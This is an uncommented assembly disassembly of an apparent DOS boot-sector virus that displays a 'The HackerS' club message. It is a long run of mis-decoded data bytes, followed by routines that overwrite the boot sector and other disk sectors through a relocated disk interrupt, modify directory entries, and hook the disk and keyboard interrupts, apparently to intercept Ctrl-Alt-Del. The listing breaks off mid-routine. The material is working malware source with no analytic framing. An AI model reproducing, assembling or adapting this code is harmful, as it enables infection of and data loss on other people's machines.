		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		or	ch,[bp+si+0A8h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,byte ptr ds:[2800h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bp+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		or	ch,[bp+si+0A0h]
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		or	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		mov	al,ds:data_0033e
		add	[bx+si],al
		or	ch,[bp+si+80h]
		add	[bx+si],al
		add	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],2Ah	; '*'
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		test	al,0
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bp+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		test	al,0
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,byte ptr ds:[0F600h]
		and	ax,28h
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,byte ptr ds:[2800h]
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,byte ptr ds:[0AA0Ah]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	ch,[bp+si+0AAh]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0181e
		add	[bx+si],al
		add	[bp+si-5556h],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		mov	al,ds:data_0182e
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		or	ch,[bp+si+80h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0185e
		add	byte ptr [bx+si],0
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		add	[bx+si],al
		add	[bp+si+0AAh],ch
		or	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,byte ptr ds:[0AA0Ah]
		mov	al,ds:data_0033e
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		add	[bx+si],al
		add	ch,[bp+si+0A8h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		or	ch,[bp+si-5556h]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0183e
		test	al,0
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		sub	ch,[bp+si+0A0h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bp+si-7F56h],ch
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bx+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	ch,[bp+si+0AAh]
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		mov	al,byte ptr data_0041+40h	; (' ')
		stosb				; Store al to es:[di]
		test	al,0
		add	ch,[bp+si+0A0h]
		or	ch,[bp+si+0A0h]
		add	[bp+si-5556h],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		or	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		or	ch,[bp+si+80h]
		mul	byte ptr [si]		; ax = data * al
		sub	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+200h]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	ch,[bp+si+0A8h]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		or	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		add	byte ptr [bx+si],0
		add	[bx+si],al
		or	ch,[bp+si+80h]
		add	[bx+si],al
		add	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],2Ah	; '*'
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		sub	ch,[bp+si+80h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		or	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		test	al,0
		add	[bx+si],al
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bp+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		stosb				; Store al to es:[di]
		test	al,0
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+0A0h]
		add	[bx+si],al
		or	ch,[bp+si+80h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,byte ptr data_0041+40h	; (' ')
		stosb				; Store al to es:[di]
		mov	al,byte ptr data_0041+40h	; (' ')
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		add	[bx+si],al
		sub	ch,[bp+si+0A0h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si-7F56h]
		add	[bx+si],al
		or	ch,[bp+si+80h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		sub	al,[bx+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		add	ch,[bp+si+0A8h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si-5556h],ch
		add	[bx+si],al
		or	ch,[bp+si+80h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		or	ch,[bp+si+0A8h]
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0179e
		or	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		add	[bp+si+0AAh],ch
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		test	al,0
		or	ch,[bp+si+80h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,byte ptr ds:[0A00Ah]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	dh,dh
		and	bp,[bx+si]
		add	[bx+si],al
		push	ax
		push	bx
		push	cx
		push	dx
		cmp	data_0045,1
		jne	loc_0021		; Jump if not equal
		cmp	data_0044,0
		je	loc_0022		; Jump if equal
loc_0021:
		xor	ah,ah			; Zero register
		int	6Fh			; ??int non-standard interrupt
		jc	loc_0022		; Jump if carry Set
		mov	dh,data_0044
		mov	dl,byte ptr cs:[529h]
		mov	cx,data_0045
		mov	bx,200h
		mov	ax,201h
		int	6Fh			; ??int non-standard interrupt
loc_0022:
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
sub_0003	endp

		db	 50h, 53h, 51h, 52h, 32h
		dw	0CDE4h			; Data table (indexed access)
		db	6Fh
		dw	1272h			; Data table (indexed access)
		db	 32h,0F6h, 2Eh, 8Ah, 16h, 29h
		db	 05h,0B9h, 21h, 28h,0BBh, 00h
		db	 02h,0B8h, 01h, 02h,0CDh, 6Fh
		db	 5Ah, 59h, 5Bh, 58h,0C3h, 50h
		db	 53h, 51h, 52h, 32h,0E4h,0CDh
		db	 6Fh, 72h, 1Ah, 32h,0F6h, 8Ah
		db	 16h, 29h, 05h,0B5h, 28h,0BBh
		db	 7Ch, 06h,0B8h, 09h, 05h,0CDh
		db	 6Fh, 73h, 05h,0F6h,0C4h, 82h
		db	 75h, 03h
		db	0E8h, 29h, 00h
		db	 5Ah, 59h, 5Bh, 58h,0C3h, 28h
		db	 00h, 21h, 02h, 28h, 00h, 22h
		db	 02h, 28h, 00h, 23h, 02h, 28h
		db	 00h, 24h, 02h, 28h, 00h, 25h
		db	 02h, 28h, 00h, 26h, 02h, 28h
		db	 00h, 27h, 02h, 28h, 00h, 28h
		db	 02h, 28h, 00h, 29h, 02h

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0005	proc	near
		push	ax
		push	bx
		push	cx
		push	dx
		xor	ah,ah			; Zero register
		int	6Fh			; ??int non-standard interrupt
		jc	loc_0026		; Jump if carry Set
		xor	dh,dh			; Zero register
		mov	dl,byte ptr ds:[529h]
		mov	cx,2821h
		mov	bx,200h
		mov	ax,309h
		int	6Fh			; ??int non-standard interrupt
		jnc	loc_0025		; Jump if carry=0
		test	ah,82h
		jnz	loc_0026		; Jump if not zero
loc_0025:
		xor	bx,bx			; Zero register
		call	sub_0006
		cmp	cs:data_0050,3
		jb	loc_0026		; Jump if below
		call	sub_0007
loc_0026:
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
sub_0005	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0006	proc	near
		push	ax
		push	cx
		push	dx
		xor	ah,ah			; Zero register
		int	6Fh			; ??int non-standard interrupt
		jc	loc_0027		; Jump if carry Set
		xor	dh,dh			; Zero register
		mov	dl,byte ptr cs:[529h]
		mov	cx,1
		mov	ax,301h
		int	6Fh			; ??int non-standard interrupt
loc_0027:
		pop	dx
		pop	cx
		pop	ax
		retn
sub_0006	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0007	proc	near
;*		jmp	short loc_0028		;*
		db	0EBh, 10h
		nop
		pop	cx
		stc				; Set carry flag
		inc	bx
		stc				; Set carry flag
		xor	cx,di
		inc	bp
		stc				; Set carry flag
		push	dx
		stc				; Set carry flag
		push	ax
		add	[bx+si],al
		push	es
		add	[bx+si+53h],dx
		push	cx
		push	dx
		push	ds
		push	es
		push	si
		push	di
		mov	al,byte ptr ds:[529h]
		mov	byte ptr ds:[701h],al
		mov	byte ptr ds:[704h],1
		mov	byte ptr ds:[702h],0
		mov	byte ptr ds:[703h],6
loc_0029:
		mov	dh,byte ptr ds:[702h]
		mov	dl,byte ptr ds:[701h]
		xor	ch,ch			; Zero register
		mov	cl,byte ptr ds:[703h]
		lea	bx,cs:[1277h]		; Load effective addr
		mov	ax,201h
		int	6Fh			; ??int non-standard interrupt
		xor	bx,bx			; Zero register
loc_0030:
		mov	al,byte ptr ds:[1282h][bx]
		test	al,8
		jz	loc_0031		; Jump if zero
		or	byte ptr ds:[1282h][bx],9
		lea	si,ds:[6F6h]		; Load effective addr
		lea	di,[bx+1277h]		; Load effective addr
		mov	cx,0Bh
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		xor	al,al			; Zero register
		lea	di,[bx+1283h]		; Load effective addr
		mov	cx,14h
		stosb				; Store al to es:[di]
		call	sub_0008
		jmp	short loc_0035
		db	90h
loc_0031:
		add	bx,20h
		cmp	bx,200h
		jae	loc_0032		; Jump if above or =
		jmp	short loc_0030
loc_0032:
		cmp	byte ptr ds:[703h],9
		jb	loc_0033		; Jump if below
		xor	byte ptr ds:[702h],1
		mov	byte ptr ds:[703h],1
		jmp	short loc_0034
loc_0033:
		inc	byte ptr ds:[703h]
loc_0034:
		inc	byte ptr ds:[704h]
		cmp	byte ptr ds:[704h],7
		ja	loc_0035		; Jump if above
		jmp	short loc_0029
loc_0035:
		pop	di
		pop	si
		pop	es
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
sub_0007	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0008	proc	near
		push	ax
		push	bx
		push	cx
		push	dx
		xor	ah,ah			; Zero register
		int	6Fh			; ??int non-standard interrupt
		jc	loc_0036		; Jump if carry Set
		mov	dh,byte ptr ds:[702h]
		mov	dl,byte ptr ds:[701h]
		xor	ch,ch			; Zero register
		mov	cl,byte ptr ds:[703h]
		lea	bx,cs:[1277h]		; Load effective addr
		mov	ax,301h
		int	6Fh			; ??int non-standard interrupt
loc_0036:
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
sub_0008	endp

		db	0E9h, 0Bh
		db	0Ah, 'The HackerS'
		db	 00h, 00h, 00h, 00h,0AAh,0A8h
		db	 00h,0AAh,0A0h, 00h, 00h, 00h
		db	 00h, 0Ah,0AAh,0AAh,0AAh,0AAh
		db	0AAh,0A0h, 00h, 20h, 00h, 00h
		db	 00h, 00h, 00h, 0Ah,0AAh, 80h
		db	 00h, 00h, 00h, 02h
		db	7 dup (0AAh)
		db	0A8h, 00h, 2Ah,0AAh, 00h, 00h
		db	0F6h, 22h, 28h, 00h, 00h,0EBh
		db	 66h, 90h, 21h, 00h, 02h, 87h
		db	0E9h, 00h,0F0h, 91h, 08h, 00h
		db	0C8h, 00h, 00h
		db	' Welcome to the'
		db	'     C l u b     --The HackerS--'
		db	'     Hackin', 27h, '       All T'
		db	'he Time  '
		db	 00h, 00h,0FFh,0FFh, 00h, 7Ch
		db	 00h
		db	 00h, 9Ch, 50h, 1Eh, 06h, 56h
		db	 57h, 33h,0C0h, 8Eh,0D8h, 8Eh
		db	0C0h, 2Eh,0C6h, 06h, 05h, 04h
		db	 08h,0A1h, 4Ch, 00h, 3Dh, 26h
		db	 05h, 74h, 3Fh,0FAh, 2Eh,0FFh
		db	 06h, 03h, 04h,0A1h, 4Ch, 00h
		db	0A3h,0BCh, 01h, 2Eh,0A3h, 0Ah
		db	 04h,0A1h, 4Eh, 00h,0A3h,0BEh
		db	 01h, 2Eh,0A3h, 0Ch, 04h,0B8h
		db	 26h, 05h,0A3h, 4Ch, 00h, 8Ch
		db	0C8h,0A3h, 4Eh, 00h,0A1h, 24h
		db	 00h, 2Eh,0A3h, 06h, 04h,0A1h
		db	 26h, 00h, 2Eh,0A3h, 08h, 04h
		db	0C7h, 06h, 24h, 00h,0D9h, 04h
		db	 8Ch,0C8h,0A3h, 26h, 00h,0FBh
loc_0039:
		push	cs
		pop	ds
		mov	si,offset data_0041+40h	; (' ')
		mov	di,data_0011e
		mov	cx,200h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	di
		pop	si
		pop	es
		pop	ds
		pop	ax
		popf				; Pop flags
		jmp	cs:data_0057
		sti				; Enable interrupts
		push	ax
		push	cx
		push	ds
		pushf				; Push flags
		xor	ax,ax			; Zero register
		mov	ds,ax
		in	al,60h			; port 60h, keybd scan or sw1
		test	al,80h
		jnz	loc_0042		; Jump if not zero
		mov	ah,ds:keybd_flags_1_
		test	ah,8
		jz	loc_0042		; Jump if zero
		test	ah,4
		jz	loc_0042		; Jump if zero
		cmp	al,53h			; 'S'
		jne	loc_0040		; Jump if not equal
		cmp	byte ptr ds:video_mode_,7
		je	loc_0041		; Jump if equal
		cmp	cs:data_0050,3
